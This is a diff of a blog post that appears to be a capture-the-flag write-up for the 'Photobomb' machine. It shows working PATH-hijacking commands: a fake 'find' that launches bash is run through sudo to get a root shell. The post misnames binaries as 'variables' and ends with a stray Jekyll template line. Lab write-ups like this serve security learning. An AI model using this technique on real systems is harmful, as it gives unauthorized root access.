@@ -148,7 +148,6 @@ wizard@photobomb:~$
 So how looked that the user wizard *(us)* should to run a script bash file called `cleanup.sh` that will allow us to manipulate the enviroment's variables with the following script:
 
 ```console
-wizard@photobomb:~$ cat /opt/cleanup.sh
 #!/bin/bash
 . /opt/.bashrc
 cd /home/wizard/photobomb
@@ -162,26 +161,41 @@ fi
 
 # protect the priceless originals
 find source_images -type f -name '*.jpg' -exec chown root:root {} \;
-wizard@photobomb:~$ 
+
 ```
 {: file="opt/cleanup.sh" }
 
 ### $PATH Hijacking
-Well let's start to hijack some variables like `find` 
+Well let's start to hijack some variables like `find` from `/tmp/` directory
 
 ```console
-wizard@photobomb:~$ touch find
-wizard@photobomb:~$ chmod +x find    #give it execution permissions
-wizard@photobomb:~$ nano find        # writting from this variable
+wizard@photobomb:~/tmp$ touch find
+wizard@photobomb:~/tmp$ chmod +x find    #give it execution permissions
+wizard@photobomb:~/tmp$ nano find        # writting from this variable
 ```
-On variable `find` we write `bash` that when executing as **root** they give us a bash bin in the `$PATH` environment,
+> `find` is a variable in bash located `/usr/bin/find` but in this case the script does not specify the absolute path of that variable, therefore we can take advantage of that to manipulate it by becoming as **root** {: .prompt-tip }
+
+On variable `find` we write `bash` that when executing as **root** they give us a bash bin in the `$PATH` environment:
 
 ```console
 bash
 ```
 {: file="find" }
 
+Now what we must do is bring all documentation from `/tmp/` directory to our `PATH` environment, since when executed as **root** it will launch us an bash
 
+```console
+wizard@photobomb:~/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
+```
+
+And we become **root**
+
+```console
+root@photobomb:~/home/wizard/photobomb$ whoami
+root
+root@photobomb:~/home/wizard/photobomb$ 
+
+```
 
 
 # Create a new file named `YYYY-MM-DD-TITLE.EXTENSION`{: .filepath} and put it in the `_posts`{: .filepath} of the root directory. Please note that the `EXTENSION`{: .filepath} must be one of `md`{: .filepath} and `markdown`{: .filepath}. If you want to save time of creating files, please consider using the plugin `Jekyll-Compose`(https://github.com/jekyll/jekyll-compose) to accomplish this.
